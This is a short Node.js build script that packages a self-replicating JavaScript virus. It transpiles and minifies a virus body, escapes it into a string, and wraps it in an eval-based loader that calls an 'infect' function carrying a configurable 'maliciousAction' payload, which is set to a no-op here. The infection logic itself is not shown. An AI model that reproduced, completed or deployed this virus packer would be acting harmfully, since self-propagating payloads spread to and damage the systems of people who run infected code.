const fs   = require( "fs-extra" );
const exec = require( "child-process-promise" ).exec;

const maliciousAction = "(() => null)();";

function getCopyOfVirus( virusSrc, action ) {
    const esc = str => str
        .replace(/[\\"]/g, "\\$&")
        .replace(/[\n\r]/g, "\\n");
    return `
(function() {
    var virusSrc = "${ esc( virusSrc ) }";
    var action   = "${ esc( action ) }";
    eval( action + virusSrc + "infect(virusSrc, action);" ); 
})();`;
}


async function build() {

    var src = "body.js";
    var compiled = ".build/body.compiled.js";
    var minified = ".build/body.min.js";
        
    var tgt = "payload.built.js";

    await fs.ensureDir( ".build" );
    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
    await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );

    var raw = await fs.readFile( minified, "utf-8" );
    await fs.writeFile( tgt, getCopyOfVirus( raw, maliciousAction ) );
}

build();
